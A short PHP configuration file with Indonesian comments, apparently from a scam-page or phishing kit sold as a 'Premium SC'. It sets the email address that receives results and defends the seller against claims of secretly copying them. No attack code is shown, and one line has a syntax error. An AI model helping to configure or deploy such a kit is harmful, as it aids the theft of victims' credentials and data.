<?php

$pulberaja = 'pulberaja5@gmail.com'; // GANTI EMAIL KAMU DISINI


$pembuat = 'PulberAja'; //Jangan di hapus kalo gak mau rusak

?>



<!-- TUTORIAL -->

<?php
$tutorial = 'BERGUNA LAH'

// Bila ingin tahu send 2 mail tidak nya silahkan cek di Track Delivery di cPanel agar tau anda para perusak reputasi yang bialng send 2 mail
// Premium SC with PulberAja
// Pembuat: Nanang
?>